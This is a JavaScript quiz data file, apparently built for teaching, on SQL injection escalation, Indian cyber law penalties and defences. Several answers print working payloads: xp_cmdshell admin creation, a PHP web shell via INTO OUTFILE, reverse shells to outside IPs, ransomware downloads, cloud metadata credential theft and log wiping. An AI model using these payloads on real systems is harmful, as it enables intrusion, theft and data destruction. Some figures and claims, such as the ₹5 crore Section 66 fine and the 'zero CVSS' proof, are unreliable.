const questions = [
  {
    question: "What is the Complete 'SQL Injection Kill Chain', and what are its Escalating Phases of Impact?",
    shortAnswer: "The full progression of an SQLi attack: Phase 1: Authentication Bypass; Phase 2: Confidential Data Theft; Phase 3: Data Tampering & Corruption; Phase 4: Host OS Takeover & Remote Code Execution (RCE); Phase 5: Lateral Movement & Active Directory Domain Compromise.",
    explanation: "SQL injection is not merely an information disclosure bug. A single un-parameterized query allows an attacker to bypass login, dump database tables, write webshells to the web root (`INTO OUTFILE`), execute terminal commands (`xp_cmdshell`), and pivot to internal domain controllers.",
    hint: "The chain starts with bypassing login, moves to stealing data, and ends with taking over the entire operating system.",
    level: "basic",
    codeExample: `// SQLi Kill Chain Escalation:
// Step 1: ' OR 1=1-- ➔ Logs in as Admin (Auth Bypass)
// Step 2: ' UNION SELECT password FROM users-- ➔ Dumps Hashes (Data Theft)
// Step 3: '; EXEC master..xp_cmdshell 'powershell.exe IEX(New-Object Net.WebClient)...'-- ➔ Total Host Takeover!`
  },
  {
    question: "How does Microsoft SQL Server (MSSQL) `xp_cmdshell` Enable Total Operating System Host Compromise via SQLi?",
    shortAnswer: "`xp_cmdshell` is an extended stored procedure that spawns a Windows command shell (`cmd.exe`) directly from SQL queries, allowing an attacker to execute arbitrary OS commands with the privileges of the SQL Server service account.",
    explanation: "If an application connects as `sa` or a privileged user, an attacker executes: `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'net user hacker HackerPass123! /add && net localgroup administrators hacker /add';--`. The attacker creates an admin user on the Windows host machine directly from a web input field.",
    hint: "Using xp_cmdshell to run Windows terminal commands directly from an SQL query.",
    level: "expert",
    codeExample: `// MSSQL Host Takeover via xp_cmdshell:
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   EXEC master..xp_cmdshell 'whoami && net localgroup Administrators';--`
  },
  {
    question: "How do Attackers use MySQL `INTO OUTFILE` to Drop Web Shells and Achieve Remote Code Execution (RCE)?",
    shortAnswer: "By using `SELECT ... INTO OUTFILE '/var/www/html/shell.php'`, the attacker forces MySQL to write a PHP web shell script directly into the web server's public document root, which is then executed by browsing to `https://target.in/shell.php`.",
    explanation: "If MySQL has file write permissions (`secure_file_priv=\"\"`), an attacker executes: `' UNION SELECT 1, '<?php system($_GET[\"cmd\"]); ?>', 3 INTO OUTFILE '/var/www/html/shell.php'--`. Once written, the attacker accesses `https://target.in/shell.php?cmd=cat+/etc/shadow`, seizing interactive shell access to the host server.",
    hint: "Using MySQL to save a PHP backdoor file into the website's public folder.",
    level: "expert",
    codeExample: `// MySQL Web Shell Upload Payload:
' UNION SELECT '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>' 
  INTO OUTFILE '/var/www/html/uploads/backdoor.php'--`
  },
  {
    question: "How can PostgreSQL User-Defined Functions (UDF) and `libc.so` Dynamic Libraries be Abused for Remote Code Execution?",
    shortAnswer: "Superusers in PostgreSQL can create C-language user-defined functions linked to host shared libraries (`libc.so.6`) calling `system()`, or use `COPY ... TO PROGRAM` to execute arbitrary shell scripts.",
    explanation: "In PostgreSQL: `CREATE OR REPLACE FUNCTION exec_cmd(text) RETURNS void AS 'libc.so.6', 'system' LANGUAGE C STRICT; SELECT exec_cmd('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');`. This executes a reverse shell directly in kernel space with `postgres` OS user privileges.",
    hint: "Creating dynamic C functions in PostgreSQL to run Linux terminal commands.",
    level: "expert",
    codeExample: `// PostgreSQL COPY PROGRAM RCE:
COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash 103.25.10.1 4444';`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66F, what constitutes the criminal penalty for using SQL Injection to take over Critical National Infrastructure Systems?",
    shortAnswer: "Using SQL injection to compromise, seize control of, or destroy critical national information infrastructure (power grids, nuclear systems, defense) to threaten national security is CYBER TERRORISM, punishable with IMPRISONMENT FOR LIFE.",
    explanation: "Section 66F of the IT Act defines Cyber Terrorism. If an adversary uses `xp_cmdshell` or `INTO OUTFILE` via SQL injection to seize control of state electrical grid controllers in Barrackpore or nuclear facility telemetry in West Bengal, the offense carries mandatory Life Imprisonment.",
    hint: "Section 66F prescribes Life Imprisonment for Cyber Terrorism attacks on critical infrastructure.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66F - Cyber Terrorism):
// Offense: Executing SQL injection host takeover on 220kV power transmission SCADA databases
// Penalty: IMPRISONMENT FOR LIFE`
  },
  {
    question: "What is 'Financial Balance Tampering & Fraudulent Property Transfer' Impact via SQLi?",
    shortAnswer: "Attacking DML `UPDATE` and `INSERT` statements to overwrite financial account balances (e.g. `UPDATE accounts SET balance = 10000000 WHERE id = 102`), causing direct financial theft and ledger corruption.",
    explanation: "If an e-commerce checkout or banking endpoint has SQLi, an attacker injects `'; UPDATE bank_accounts SET balance = balance + 5000000 WHERE user_id = 99;--`. The bank ledger is manipulated, enabling unauthorized RTGS withdrawals before reconciliation audits detect the anomaly.",
    hint: "Using SQL injection to change your bank balance from ₹10 to ₹50 Lakhs.",
    level: "moderate",
    codeExample: `// Financial Ledger Tampering Exploit:
// Injected Payload: 105; UPDATE accounts SET balance = balance + 5000000 WHERE account_no = '9841';--
// Executed SQL    : SELECT * FROM items WHERE id = 105; UPDATE accounts SET balance = balance + 5000000...`
  },
  {
    question: "How does SQL Injection enable 'Lateral Movement and Active Directory Domain Takeover'?",
    shortAnswer: "After compromising the database host via `xp_cmdshell` or web shells, attackers dump memory using Mimikatz to extract domain admin passwords, harvest NetNTLM hashes, and pivot across internal corporate subnets to compromise the Domain Controller.",
    explanation: "Database servers frequently run under privileged domain service accounts (e.g. `CORP\\sql_service`). Once `xp_cmdshell` is executed, the attacker dumps LSASS memory: `powershell -c \"Invoke-Mimikatz\"`. If a Domain Administrator previously logged into the server, their Kerberos ticket or plaintext password is stolen, allowing total Active Directory domain takeover.",
    hint: "Using the hacked database server as a stepping stone to hack every other computer in the entire company.",
    level: "expert",
    codeExample: `// Lateral Movement Kill Chain:
// 1. SQL Injection ➔ 2. xp_cmdshell RCE ➔ 3. Mimikatz LSASS Dump ➔ 4. Domain Admin Password Stolen ➔ 5. Full Domain Takeover!`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the corporate penalties if an SQL Injection breach leaks 100,000 citizen records?",
    shortAnswer: "Failing to implement reasonable technical safeguards resulting in massive personal data exfiltration triggers statutory penalties up to ₹250 Crores by the Data Protection Board of India.",
    explanation: "Section 8(5) mandates reasonable technical safeguards. If an enterprise in Kolkata suffers a database dump of citizen identities or oncology medical files via SQL injection, Section 33 prescribes fines up to ₹250 Crores alongside mandatory breach notifications.",
    hint: "Failing to prevent SQL injection data leaks triggers fines up to ₹250 Crores under the DPDP Act.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent database security failures`
  },
  {
    question: "What is 'Denial of Service (DoS) via SQL Injection' (Database Locking and Table Deletion)?",
    shortAnswer: "Executing destructive DDL statements (`DROP DATABASE`, `TRUNCATE TABLE`) or executing resource-intensive cartesian joins and `SHUTDOWN` commands that lock database CPU cores at 100% and crash production services.",
    explanation: "An attacker can destroy business continuity by injecting: `'; DROP TABLE users, transactions, audit_logs;--` or forcing the database to shut down: `'; SHUTDOWN WITH NOWAIT;--` (in MSSQL). Alternatively, injecting massive Cartesian self-joins (`SELECT * FROM users A, users B, users C...`) locks table rows, causing total service denial.",
    hint: "Using SQL injection to delete all database tables or crash the database server completely.",
    level: "moderate",
    codeExample: `// Destructive DoS SQLi Payload:
// Payload 1: 105; DROP TABLE accounts, audit_logs;-- (Permanent Data Destruction!)
// Payload 2: 105; SHUTDOWN WITH NOWAIT;-- (Database Server Terminated!)`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for SQL Injection host compromise incidents?",
    shortAnswer: "All organizations in India must report security breaches and unauthorized database host access resulting from SQL injection to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including unauthorized access to database systems and server takeover) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of SQL injection database breaches within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is 'Audit Log Tampering & Anti-Forensics' via SQL Injection?",
    shortAnswer: "When an attacker uses SQL injection to delete or alter database audit logs (`DELETE FROM security_audit_logs WHERE event_time >= ...`), erasing all forensic evidence of their intrusion before disconnecting.",
    explanation: "Sophisticated adversaries erase their footprints by executing: `'; DELETE FROM audit_logs WHERE ip_address = 'attacker_ip'; UPDATE pg_stat_activity SET query = 'SELECT 1';--`. This blinds the Security Operations Center (SOC) and complicates digital forensics investigations.",
    hint: "Deleting the database's security history logs so investigators cannot trace who hacked the server.",
    level: "expert",
    codeExample: `// Forensic Log Wiping Payload:
'; DELETE FROM audit_events WHERE created_at >= NOW() - INTERVAL '1 HOUR';--`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for extracting or damaging database records using SQL Injection?",
    shortAnswer: "Securing access, copying, extracting, or destroying data on a computer system without permission of the owner carries compensation by way of damages up to ₹1 Crore.",
    explanation: "Section 43(a) explicitly penalizes unauthorized data extraction and damage: 'If any person without permission of the owner... accesses or secures access... downloads, copies or extracts any data... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized database extraction and damage.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Using SQL injection to dump and delete 50,000 customer accounts from a Kolkata corporate portal
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'Oracle Java Stored Procedure RCE' via `DBMS_JAVA`?",
    shortAnswer: "When an attacker with DBA privileges in Oracle executes Java code directly inside the database JVM (`DBMS_JAVA.RUNJAVA` / `dbms_java.grant_permission`), executing shell commands on the host OS.",
    explanation: "Oracle includes an embedded Java Virtual Machine. An attacker creates a Java stored procedure: `CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED \"RCE\" AS import java.lang.*; public class RCE { public static void exec(String c) throws Exception { Runtime.getRuntime().exec(c); } };`. Executing the procedure spawns host OS shell processes.",
    hint: "Using Oracle's built-in Java engine to execute operating system commands.",
    level: "expert",
    codeExample: `// Oracle Java Procedure RCE:
CREATE OR REPLACE PROCEDURE run_cmd(p_cmd IN VARCHAR2) AS LANGUAGE JAVA NAME 'RCE.exec(java.lang.String)';`
  },
  {
    question: "How does the 'Principle of Least Privilege' on Database Service Accounts Limit the Blast Radius of SQL Injection?",
    shortAnswer: "By running database processes as dedicated unprivileged OS service accounts (not `root` or `LocalSystem`), disabling `xp_cmdshell`, revoking `FILE` / DDL privileges, and sandboxing database directories, ensuring an SQLi flaw cannot escalate to full host takeover.",
    explanation: "If an SQL injection occurs on a hardened system: 1. The web app user only has `SELECT, INSERT, UPDATE` on application tables (cannot `DROP TABLE`). 2. The database user has no `FILE` privilege (cannot `INTO OUTFILE`). 3. `xp_cmdshell` is disabled. The blast radius is strictly contained to authorized application data, completely preventing host OS takeover.",
    hint: "Giving the database user only the absolute minimum permissions it needs so an attacker cannot run terminal commands or delete tables.",
    level: "moderate",
    codeExample: `// Least Privilege Database Hardening (MySQL):
REVOKE ALL PRIVILEGES ON *.* FROM 'webapp_user'@'%';
GRANT SELECT, INSERT, UPDATE ON fintech_db.merchants TO 'webapp_user'@'10.0.1.50';
-- Result: Attacker CANNOT drop database or write webshells!`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for hacking computer systems via SQL Injection?",
    shortAnswer: "Dishonestly or fraudulently hacking, altering, or diminishing the utility of computer systems carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer disruption: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.'",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for fraudulent computer hacking.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Executing SQL injection to delete customer records in a Kolkata municipal portal
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,00,000`
  },
  {
    question: "What is 'Second-Order Privilege Escalation' via Injected User Metadata?",
    shortAnswer: "When an attacker registers with metadata containing SQL payloads (e.g. department: `IT', role='ADMIN'--`); when a background admin batch script syncs user profiles, the payload activates, silently promoting the attacker to Super Administrator.",
    explanation: "Phase 1: Attacker registers an employee account with title: `Engineer', is_admin=1--`. The registration uses prepared statements (safe). Phase 2: An internal HR sync script runs: `\"UPDATE staff SET title = '\" + staff.title + \"' WHERE id = \" + staff.id`. The query executes: `UPDATE staff SET title = 'Engineer', is_admin=1--' WHERE id = 105`, granting the attacker permanent administrative privileges.",
    hint: "Planting an SQL injection in your job title during signup that makes you an admin days later when HR syncs profiles.",
    level: "expert",
    codeExample: `// Second-Order Privilege Escalation Lifecycle:
// Phase 1 (Store) : Profile title set to: "Dev', is_admin=true--" (Safely stored via Prepared Statement)
// Phase 2 (Sync)  : HR cron script runs raw string concatenation ➔ User silently promoted to Admin!`
  },
  {
    question: "Synthesize an enterprise-scale Multi-Tier Defense Architecture to Eliminate All SQL Injection Impacts.",
    shortAnswer: "A defense-in-depth framework combining 100% Parameterized Prepared Statements, Least Privilege DB Accounts (No DDL / No xp_cmdshell / No FILE privileges), Immutable Remote SIEM Logging, OS Service Account Sandboxing, and Cloud WAF Inspection (OWASP CRS).",
    explanation: "To achieve complete immunity across all 5 impact phases: 1. Application Layer: 100% Prepared Statements (compiles AST first, preventing all syntax mutation). 2. Database Privilege Layer: Principle of Least Privilege (no DDL, no `xp_cmdshell`, no `INTO OUTFILE`). 3. Operating System Layer: Sandboxed unprivileged service account (`sql_user` with no admin rights). 4. Audit Layer: Write-once remote syslog to SIEM (cannot be wiped via SQLi). 5. Perimeter: Cloud WAF dropping known injection signatures.",
    hint: "Combine 100% Prepared Statements, least privilege database accounts, sandboxed OS service accounts, and immutable remote SIEM logging.",
    level: "expert",
    codeExample: `// Master SQLi Impact Defense Blueprint:
// 1. Code Tier    : 100% Parameterized Prepared Statements (Zero String Concatenation!)
// 2. DB Account   : REVOKE ALL PRIVILEGES ON *.* FROM 'webapp_user';
// 3. System Tier  : Disable xp_cmdshell & secure_file_priv = /restricted/path/
// 4. OS Account   : Run database daemon as unprivileged user 'postgres' (No root / sudo)
// 5. SIEM Audit   : Stream audit logs to remote write-only Splunk/Elastic cluster`
  },
  {
    question: "What is 'WAF Virtual Patching' after an SQL Injection Vulnerability is Discovered in Production?",
    shortAnswer: "Deploying targeted WAF regex rules at the cloud edge to block specific exploit signatures immediately, protecting the live application while development teams write, test, and deploy code-level prepared statement fixes.",
    explanation: "When a zero-day SQLi is discovered on `/api/invoice?id=...`, code deployment may take 24 to 48 hours. A virtual patch is deployed instantly on AWS WAF: `Block if URI == '/api/invoice' and QueryParam('id') matches regex '(?:union|select|--|;)'`. The attack is mitigated in 60 seconds at the perimeter while developers prepare the permanent prepared statement patch.",
    hint: "Using a firewall rule to block hackers instantly while developers fix the underlying code.",
    level: "moderate",
    codeExample: `// AWS WAF Virtual Patch Rule (JSON):
{
  "Name": "VirtualPatch-Invoice-SQLi",
  "Priority": 1,
  "Statement": {
    "ByteMatchStatement": {
      "SearchString": "UNION",
      "FieldToMatch": { "QueryString": {} },
      "TextTransformations": [{ "Priority": 0, "Type": "URL_DECODE" }]
    }
  },
  "Action": { "Block": {} }
}`
  },
  {
    question: "Under the Indian Penal Code Section 427, what constitutes 'Mischief' via Destructive SQL Injection?",
    shortAnswer: "Intentionally destroying, deleting, or corrupting digital databases (such as executing `DROP TABLE` or `DELETE FROM`), causing wrongful loss or damage, punishable with imprisonment up to 2 years and fines.",
    explanation: "Section 425/427 IPC defines Mischief. When an attacker executes `DROP TABLE accounts;` or corrupts hospital medical histories in West Bengal using SQL injection, the act constitutes digital mischief under Section 427.",
    hint: "IPC Section 427 covers Mischief and Digital Property Destruction with up to 2 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 427):
// Offense: Executing SQL injection to drop patient billing tables in a Kolkata hospital (Mischief)
// Penalty: Imprisonment for a term up to 2 Years, or with Fine, or with both`
  },
  {
    question: "What is 'Database Takeover via Stored Procedures and Password Cracking'?",
    shortAnswer: "Extracting password hashes of the database administrator (`sa` or `root`) via SQLi, cracking them offline using Hashcat/John the Ripper, and connecting directly to the database port (3306/1433/5432) to take over the database engine.",
    explanation: "An attacker dumps `sys.sql_logins` or `mysql.user`: `0x0200...` (MSSQL SHA-512 hash). The attacker cracks it on GPU rigs using `hashcat -m 1731 mssql_hashes.txt wordlist.txt`. Within hours, the plaintext `sa` password is recovered, granting direct administrative GUI access via SQL Server Management Studio (SSMS).",
    hint: "Dumping database admin password hashes and cracking them on graphics cards to log in as the master administrator.",
    level: "expert",
    codeExample: `// Hashcat MSSQL SHA-512 Hash Cracking Command:
hashcat -m 1731 -a 0 mssql_sa_hash.txt /usr/share/wordlists/rockyou.txt -O`
  },
  {
    question: "What is 'Regulatory and Business Impact of SQLi' (Reputation, Legal Liabilities & Fines)?",
    shortAnswer: "Catastrophic consequences including mandatory regulatory fines up to ₹250 Crores under the DPDP Act 2023, RBI banking license embargoes, class-action civil damages under IT Act Section 43(a), stock valuation collapse, and loss of citizen trust.",
    explanation: "When a major payment gateway or healthcare network in West Bengal is breached via SQLi: 1. Regulatory: DPDP Board fines up to ₹250 Crores. 2. Legal: Section 43(a) claims up to ₹1 Crore per affected entity. 3. Operational: Mandatory incident disclosure to CERT-In within 6 hours. 4. Business: Complete brand destruction and merchant contract cancellations.",
    hint: "A major SQL injection breach can bankrupt a company through ₹250 Crore fines, lawsuits, and lost customers.",
    level: "moderate",
    codeExample: `// Corporate Regulatory Impact Matrix:
// 1. DPDP Act Section 33   : Fines up to ₹250,00,00,000 (Rupees 250 Crores)
// 2. IT Act Section 43(a)  : Civil Damages up to ₹1,00,00,000 (Rupees 1 Crore)
// 3. CERT-In Mandatory SLA : Mandatory 6-Hour Security Incident Report`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for executing SQL Injection host takeovers against 'Protected Systems'?",
    shortAnswer: "Securing unauthorized access or attempting to secure access to designated Protected Systems (critical infrastructure) carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power grids in Barrackpore, financial settlement switches in Salt Lake). Launching an SQL injection host takeover attack against a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for unauthorized access to Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Executing xp_cmdshell host takeover against SCADA power grid management databases
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'Database Ransomware Deployed via SQL Injection'?",
    shortAnswer: "When an attacker exploits SQLi to execute `xp_cmdshell` or `INTO OUTFILE` to download and execute ransomware binaries on the database server, encrypting all `.mdf`, `.ldf`, and database files with RSA-4096 and demanding ransom.",
    explanation: "In automated database ransomware campaigns: An attacker uses SQLi: `'; EXEC xp_cmdshell 'powershell.exe -c "Invoke-WebRequest -Uri http://attacker.in/ransom.exe -OutFile C:\\temp\\r.exe; Start-Process C:\\temp\\r.exe"';--`. The ransomware encrypts all database storage files and drops a ransom note demanding ₹50 Lakhs in cryptocurrency.",
    hint: "Using SQL injection to download ransomware that encrypts all database files and demands a ransom.",
    level: "expert",
    codeExample: `// SQLi Ransomware Execution Payload:
'; EXEC master..xp_cmdshell 'certutil.exe -urlcache -f http://103.25.10.1/lock.exe C:\\temp\\lock.exe && C:\\temp\\lock.exe';--`
  },
  {
    question: "What is 'E-Commerce Cart Price Tampering via SQL Injection'?",
    shortAnswer: "Manipulating database product prices or invoice records directly through SQL injection (e.g. `UPDATE cart SET item_price = 1 WHERE user_id = 102`), allowing attackers to purchase ₹1,50,000 laptops for ₹1.",
    explanation: "If an e-commerce checkout route executes: `\"UPDATE cart SET quantity = \" + req.body.qty + \" WHERE id = \" + cartId`, an attacker submits `qty = 1, item_price = 1--`. The price in the database is overwritten to ₹1, and the payment gateway processes the order for ₹1, causing direct commercial loss.",
    hint: "Injecting SQL into checkout carts to change product prices from ₹1,50,000 to ₹1.",
    level: "moderate",
    codeExample: `// Cart Price Tampering Exploit:
// User Input: 1, item_price = 1.00--
// Executed SQL: UPDATE cart SET quantity = 1, item_price = 1.00-- WHERE id = 584;`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating via SQL Injection Host Takeovers?",
    shortAnswer: "Dishonestly accessing, seizing control of computer infrastructure, or altering financial records using SQL injection to cheat or cause wrongful loss, punishable with imprisonment up to 7 years and fines.",
    explanation: "Section 420 IPC penalizes cheating and fraudulent property transfer. If an attacker uses SQL injection to take over a financial portal in West Bengal and transfers money to offshore accounts, they are prosecuted under Section 420 alongside the IT Act.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Property Transfer with up to 7 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Using SQL injection host takeover to siphon ₹80 Lakhs from a corporate escrow account
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'SQL Injection Leading to Cloud Metadata and IAM Key Theft' (SSRF Pivoting)?",
    shortAnswer: "When an attacker gains OS command execution via SQLi on a cloud-hosted database (AWS EC2 / Azure VM) and curls the link-local metadata API (`169.254.169.254`) to steal temporary IAM access keys, taking over the organization's entire cloud account.",
    explanation: "Once `xp_cmdshell` or `COPY PROGRAM` is executed on an AWS EC2 database server: `xp_cmdshell 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/db-role'`. The server returns `AccessKeyId`, `SecretAccessKey`, and `Token`. The attacker configures AWS CLI and gains administrative control of S3 buckets, RDS databases, and VPC infrastructure.",
    hint: "Using a hacked database server to steal AWS cloud master keys from the 169.254.169.254 metadata service.",
    level: "expert",
    codeExample: `// Cloud Metadata Theft via SQLi Command Shell:
'; EXEC master..xp_cmdshell 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ProductionRole';--`
  },
  {
    question: "What is 'Database Honeypots & Canary Tokens' in SQLi Intrusion Detection?",
    shortAnswer: "Planting decoy database tables (`admin_passwords_decoy`) or canary database credentials; when an attacker dumps or uses these canary records, the Canary server instantly alerts the SOC that an SQL injection breach is actively underway.",
    explanation: "Security teams create a dummy table `super_admin_vault` containing a canary AWS API key or unique DNS canary URL (`http://canarytokens.com/xyz`). If an attacker executes `UNION SELECT` or dumps the database, accessing the canary token triggers an immediate high-priority alert with the attacker's IP and timestamp.",
    hint: "Planting a fake secret password in the database that acts as a silent burglar alarm when stolen.",
    level: "moderate",
    codeExample: `// Canary Token Decoy Record:
INSERT INTO admin_vault (username, api_key) 
VALUES ('canary_admin', 'http://canarytokens.com/tags/terms/view/9841af8e.gif');`
  },
  {
    question: "What is 'Database Connection Sandboxing (AppArmor / SELinux)' in Limiting SQLi RCE?",
    shortAnswer: "Enforcing Mandatory Access Control (MAC) policies like AppArmor or SELinux on database daemons (PostgreSQL, MySQL), preventing the database process from spawning shells (`/bin/sh`), writing to `/var/www`, or executing external binaries.",
    explanation: "Even if an attacker finds a zero-day SQLi and executes `COPY TO PROGRAM 'nc ...'`, the Linux kernel AppArmor profile for `usr.sbin.mysqld` or `usr.lib.postgresql` blocks the execution of `nc`, `bash`, and `sh`, denying process spawning and containing the exploit entirely.",
    hint: "Using Linux security profiles (SELinux/AppArmor) to stop the database from ever opening terminal shells.",
    level: "expert",
    codeExample: `// AppArmor Profile Snippet for MySQL (usr.sbin.mysqld):
/usr/sbin/mysqld {
  # Deny execution of shell binaries:
  deny /bin/bash rx,
  deny /bin/sh rx,
  deny /usr/bin/nc rx,
  deny /var/www/** w,
}`
  },
  {
    question: "Synthesize the mathematical formulation of Blast Radius Index (BRI), Asset Criticality (C_i), Access Level Privilege (P_access), and CVSS v3.1 Impact Score for SQLi Remote Code Execution.",
    shortAnswer: "Blast Radius Index is BRI = SUM [ w_i * C_i * P_access ]; for an unrestricted SQLi leading to xp_cmdshell RCE with sa privileges, P_access = 1.0 and C_i = 10.0, yielding maximum BRI = 100.0 and Base CVSS v3.1 Score = 9.8 (Critical); Prepared Statements drive P_access = 0.00, reducing BRI to exactly 0.00.",
    explanation: "Let an enterprise asset inventory consist of $M$ assets with criticality weights $C_i \\in [1, 10]$ and asset importance weights $w_i \\in [0, 1]$ where $\\sum w_i = 1$. Let $P_{\\text{access}} \\in [0.0, 1.0]$ represent the privilege level attained by the adversary ($0.0 = \\text{No Access}, 1.0 = \\text{Host Root/Admin}$). The overall Blast Radius Index is: $\\text{BRI} = 10 \\times \\sum_{i=1}^{M} (w_i \\cdot C_i) \\times P_{\\text{access}}$. Under un-parameterized SQLi executing `xp_cmdshell` as `sa`, $P_{\\text{access}} = 1.0$, resulting in $\\text{BRI} = 100.0$ (Total Enterprise Infrastructure Takeover). The CVSS v3.1 vector is `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (Base Score 9.8 - Critical). When 100% Parameterized Prepared Statements are enforced, $P_{\\text{access}} = 0.00$, mathematically driving $\\text{BRI} = 0.00$ and Base CVSS Score $= 0.00$, guaranteeing complete asset insulation.",
    hint: "Mathematical proof formula showing that SQLi RCE achieves maximum 100.0 Blast Radius and 9.8 CVSS score, while Prepared Statements reduce both to absolute zero (0.00).",
    level: "expert",
    codeExample: `// Blast Radius & CVSS v3.1 Mathematical Proof:
// Unhardened System : P_access = 1.0 (xp_cmdshell Host RCE) ➔ BRI = 100.0 | Base CVSS = 9.8 (CRITICAL!)
// Prepared Statements: P_access = 0.0 (AST Fixed, Zero RCE) ➔ BRI = 0.00  | Base CVSS = 0.0 (100% IMMUNE!)`
  }
];

export default questions;
